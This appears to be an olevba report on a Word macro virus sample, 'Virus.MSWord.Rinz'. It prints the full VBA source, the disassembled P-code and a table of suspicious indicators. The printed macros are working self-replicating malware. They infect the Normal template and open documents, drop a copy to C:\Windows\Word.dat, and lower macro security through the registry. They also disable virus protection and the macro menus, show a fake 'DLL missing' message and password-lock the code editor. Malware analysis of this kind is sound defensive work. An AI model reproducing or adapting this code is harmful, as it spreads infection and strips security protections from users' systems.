olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rinz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rinz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO rianz.bas 
in file: Virus.MSWord.Rinz - OLE stream: 'Macros/VBA/rianz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub InfekAD()
    Dim DOk As Boolean
    DOk = False
    On Error Resume Next
    
    For Each obj In ActiveDocument.VBProject.VBComponents
        If obj.Name = "rianz" Then DOk = True
        If obj.Name <> "rianz" And obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=obj.Name, _
            Object:=wdOrganizerObjectProjectItems
        End If
    Next obj
    
    If DOk = False Then
        ActiveDocument.VBProject.VBComponents.Import ("C:\windows\Word.dat")
        ActiveDocument.Save
    End If
    
End Sub

Sub InfekNT()
    Dim NTOk As Boolean
    NTOk = False
    On Error Resume Next
    
    For Each obj In NormalTemplate.VBProject.VBComponents
        If obj.Name = "rianz" Then NTOk = True
        If obj.Name <> "rianz" And obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=obj.Name, _
            Object:=wdOrganizerObjectProjectItems
        End If
    Next obj
    
    If NTOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="rianz", _
        Object:=wdOrganizerObjectProjectItems
    End If
    
    NormalTemplate.VBProject.VBComponents.Item("rianz").Export ("C:\Windows\Word.dat")
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        CommandBars("Tools").Controls("Macros").Enabled = False
        Options.ConfirmConversions = (1 - 1)
        NoActive
    End If
    
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        InfekNT
    End If
    
    Action
    NoActive
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        CommandBars("Tools").Controls("Macros").Enabled = False
        Options.ConfirmConversions = (1 - 1)
        NoActive
    End If
    InfekNT
    NoActive
    Action
End Sub

Private Sub FileSave()
    On Error Resume Next
    InfekAD
    ActiveDocument.Save
    ActiveDocument.Saved = True
End Sub

Sub AutoClose()

    On Error Resume Next
    
    InfekNT
    InfekAD
    If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 5), 5) <> "Sub I" Then
        ActiveDocument.Saved = True
    End If
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "Microsoft Word") = "C2K2X" Then
        Application.ShowVisualBasicEditor = True
    End If
End Sub

Sub NoActive()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    Application.EnableCancelKey = wdCancelDisabled
End Sub

Sub ViewVBCode()
    If InputBox("Enter password", "Microsoft Word") = "C2K2X" Then
        Application.ShowVisualBasicEditor = True
    End If
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    NoActive
End Sub

Sub ToolsMacro()
    MsgBox "A required DLL file is missing ...", vbExclamation + vbOKOnly
End Sub

Sub Action()
    If Day(Now) = Minute(Now) Then
    With ActiveDocument
        .ActiveWindow.Caption = "Rianz Yang Cantik ..."
    End With
    End If
End Sub

Sub Pesan()
    Logo = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" & Chr(13) & Chr(10) & _
           "XX           XXX   XXX      XXX    XXX    XXXXXXXXXXX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX     XXX    XX                XX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX         X    XXXXXX     XXX" & Chr(13) & Chr(10) & _
           "XX           XXX   XX          XX    X          XXXX      XXXX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX   XXX      XXX    XXXXXX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX   XXXX    XX               XX" & Chr(13) & Chr(10) & _
           "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  = by Ded's ="
    If Day(Now) = Minute(Now) Then
        P = MsgBox(Logo, vbOKOnly, "From Bandung With Love")
    End If
End Sub

Sub AutoExit()
    Pesan
    Application.Quit
End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rinz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1192 bytes
' Macros/VBA/rianz - 8312 bytes
' Line #0:
' 	FuncDefn (Sub DOk())
' Line #1:
' 	Dim 
' 	VarDefn Application (As Boolean)
' Line #2:
' 	LitVarSpecial (False)
' 	St Application 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	StartForVariable 
' 	Ld rianz 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #6:
' 	Ld rianz 
' 	MemLd New 
' 	LitStr 0x0005 "rianz"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Application 
' 	EndIf 
' Line #7:
' 	Ld rianz 
' 	MemLd New 
' 	LitStr 0x0005 "rianz"
' 	Ne 
' 	Ld rianz 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #8:
' 	LineCont 0x0004 0F 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd wdOrganizerObjectProjectItems 
' 	ParamNamed FullName 
' 	Ld rianz 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld Import 
' 	ParamNamed On 
' 	Ld OrganizerDelete 
' 	ArgsMemCall Source 0x0003 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld rianz 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' Line #12:
' 	Ld Application 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0013 "C:\windows\Word.dat"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Save 0x0001 
' Line #14:
' 	Ld ActiveDocument 
' 	ArgsMemCall InfekNT 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Sub NTOk())
' Line #20:
' 	Dim 
' 	VarDefn OrganizerCopy (As Boolean)
' Line #21:
' 	LitVarSpecial (False)
' 	St OrganizerCopy 
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld rianz 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #25:
' 	Ld rianz 
' 	MemLd New 
' 	LitStr 0x0005 "rianz"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St OrganizerCopy 
' 	EndIf 
' Line #26:
' 	Ld rianz 
' 	MemLd New 
' 	LitStr 0x0005 "rianz"
' 	Ne 
' 	Ld rianz 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #27:
' 	LineCont 0x0004 0F 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd wdOrganizerObjectProjectItems 
' 	ParamNamed FullName 
' 	Ld rianz 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld Import 
' 	ParamNamed On 
' 	Ld OrganizerDelete 
' 	ArgsMemCall Source 0x0003 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld rianz 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' Line #31:
' 	Ld OrganizerCopy 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd wdOrganizerObjectProjectItems 
' 	ParamNamed FullName 
' 	Ld NormalTemplate 
' 	MemLd wdOrganizerObjectProjectItems 
' 	ParamNamed System 
' 	LitStr 0x0005 "rianz"
' 	ParamNamed New 
' 	Ld Import 
' 	ParamNamed On 
' 	Ld OrganizerDelete 
' 	ArgsMemCall Destination 0x0004 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	LitStr 0x0013 "C:\Windows\Word.dat"
' 	Paren 
' 	LitStr 0x0005 "rianz"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall _B_str_a 0x0001 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub FileOpen())
' Line #39:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld PrivateProfileString 
' 	ArgsMemLd CommandBars 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #42:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd Controls 0x0001 
' 	ArgsMemLd Enabled 0x0001 
' 	MemSt Options 
' Line #43:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld PrivateProfileString 
' 	ArgsMemSt CommandBars 0x0003 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Macros"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd Controls 0x0001 
' 	ArgsMemLd Enabled 0x0001 
' 	MemSt Options 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld ConfirmConversions 
' 	MemSt NoActive 
' Line #47:
' 	ArgsCall wdDialogFileOpen 0x0000 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	Ld Action 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #51:
' 	ArgsCall NTOk 0x0000 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	ArgsCall AutoOpen 0x0000 
' Line #55:
' 	ArgsCall wdDialogFileOpen 0x0000 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub FileSave())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld PrivateProfileString 
' 	ArgsMemLd CommandBars 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #62:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd Controls 0x0001 
' 	ArgsMemLd Enabled 0x0001 
' 	MemSt Options 
' Line #63:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld PrivateProfileString 
' 	ArgsMemSt CommandBars 0x0003 
' Line #64:
' 	ElseBlock 
' Line #65:
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Macros"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd Controls 0x0001 
' 	ArgsMemLd Enabled 0x0001 
' 	MemSt Options 
' Line #66:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld ConfirmConversions 
' 	MemSt NoActive 
' Line #67:
' 	ArgsCall wdDialogFileOpen 0x0000 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	ArgsCall NTOk 0x0000 
' Line #70:
' 	ArgsCall wdDialogFileOpen 0x0000 
' Line #71:
' 	ArgsCall AutoOpen 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub Saved())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall DOk 0x0000 
' Line #77:
' 	Ld ActiveDocument 
' 	ArgsMemCall InfekNT 0x0000 
' Line #78:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt AutoClose 
' Line #79:
' 	EndSub 
' Line #80:
' Line #81:
' 	FuncDefn (Sub CodeModule())
' Line #82:
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' Line #85:
' 	ArgsCall NTOk 0x0000 
' Line #86:
' 	ArgsCall DOk 0x0000 
' Line #87:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Lines 
' 	ArgsMemLd OpenMyMacro 0x0002 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sub I"
' 	Ne 
' 	IfBlock 
' Line #88:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt AutoClose 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
' 	FuncDefn (Sub InputBox())
' Line #93:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsLd ShowVisualBasicEditor 0x0002 
' 	LitStr 0x0005 "C2K2X"
' 	Eq 
' 	IfBlock 
' Line #94:
' 	LitVarSpecial (True)
' 	Ld OrganizerDelete 
' 	MemSt SaveNormalPrompt 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Sub wdDialogFileOpen())
' Line #99:
' 	LitVarSpecial (False)
' 	Ld ConfirmConversions 
' 	MemSt VirusProtection 
' Line #100:
' 	LitVarSpecial (False)
' 	Ld ConfirmConversions 
' 	MemSt SavePropertiesPrompt 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld ConfirmConversions 
' 	MemSt EnableCancelKey 
' Line #102:
' 	Ld ViewVBCode 
' 	Ld OrganizerDelete 
' 	MemSt wdCancelDisabled 
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' 	FuncDefn (Sub ToolsOptions())
' Line #106:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsLd ShowVisualBasicEditor 0x0002 
' 	LitStr 0x0005 "C2K2X"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitVarSpecial (True)
' 	Ld OrganizerDelete 
' 	MemSt SaveNormalPrompt 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub wdDialogToolsOptions())
' Line #112:
' 	LitVarSpecial (True)
' 	Ld ConfirmConversions 
' 	MemSt VirusProtection 
' Line #113:
' 	LitVarSpecial (True)
' 	Ld ConfirmConversions 
' 	MemSt EnableCancelKey 
' Line #114:
' 	LitVarSpecial (True)
' 	Ld ConfirmConversions 
' 	MemSt SavePropertiesPrompt 
' Line #115:
' 	Ld vbExclamation 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #116:
' 	ArgsCall wdDialogFileOpen 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Sub ToolsMacro())
' Line #120:
' 	LitStr 0x0022 "A required DLL file is missing ..."
' 	Ld vbOKOnly 
' 	Ld Day 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Sub AutoOpen())
' Line #124:
' 	Ld Minute 
' 	ArgsLd Now 0x0001 
' 	Ld Minute 
' 	ArgsLd ActiveWindow 0x0001 
' 	Eq 
' 	IfBlock 
' Line #125:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #126:
' 	LitStr 0x0015 "Rianz Yang Cantik ..."
' 	MemLdWith Caption 
' 	MemSt Pesan 
' Line #127:
' 	EndWith 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	EndSub 
' Line #130:
' Line #131:
' 	FuncDefn (Sub Logo())
' Line #132:
' 	LineCont 0x001C 0E 00 0B 00 1A 00 0B 00 26 00 0B 00 32 00 0B 00 3E 00 0B 00 4A 00 0B 00 56 00 0B 00
' 	LitStr 0x0025 "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "XX           XXX   XXX      XXX    XXX    XXXXXXXXXXX"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "XX   XXX   XX   XX   XX   XX     XXX    XX                XX"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0038 "XX   XXX   XX   XX   XX   XX         X    XXXXXX     XXX"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003E "XX           XXX   XX          XX    X          XXXX      XXXX"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "XX   XXX   XX   XX   XX   XX   XXX      XXX    XXXXXX"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003A "XX   XXX   XX   XX   XX   XX   XXXX    XX               XX"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0033 "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  = by Ded's ="
' 	Concat 
' 	St AutoExit 
' Line #133:
' 	Ld Minute 
' 	ArgsLd Now 0x0001 
' 	Ld Minute 
' 	ArgsLd ActiveWindow 0x0001 
' 	Eq 
' 	IfBlock 
' Line #134:
' 	Ld AutoExit 
' 	Ld Day 
' 	LitStr 0x0016 "From Bandung With Love"
' 	ArgsLd MsgBox 0x0003 
' 	St merge_cmd 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndSub 
' Line #137:
' Line #138:
' 	FuncDefn (Sub Quit())
' Line #139:
' 	ArgsCall Logo 0x0000 
' Line #140:
' 	Ld OrganizerDelete 
' 	ArgsMemCall id_03CC 0x0000 
' Line #141:
' 	EndSub 
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

